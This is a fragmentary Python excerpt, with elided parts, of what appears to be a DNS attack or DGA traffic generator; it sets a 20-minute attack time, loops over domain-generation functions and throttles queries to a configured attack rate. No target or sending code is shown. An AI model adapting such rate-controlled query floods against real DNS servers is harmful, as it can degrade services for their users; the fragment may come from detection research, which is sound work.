...
def main():
    reload(dns.resolver)
    logging.basicConfig(filename='log/attack06_21.log', level=logging.INFO)
    
    attacktime = 20*60# in second
    dlay = 1 # 0 no delay
    ...
    for func in domain_generator:
         while True:
                ...
                logging.info('attackrate = %d qpm, attacktime = %d s, Domain Generator = %s',attackrate,attacktime,func.__name__)
                now = datetime.now()
                 ###### DGA
                while True:
                    ...
                    while True: # to adjust qps.
                        if datetime.now() >= sendtime + timedelta(seconds = rateinterval/attackrate):
                            break
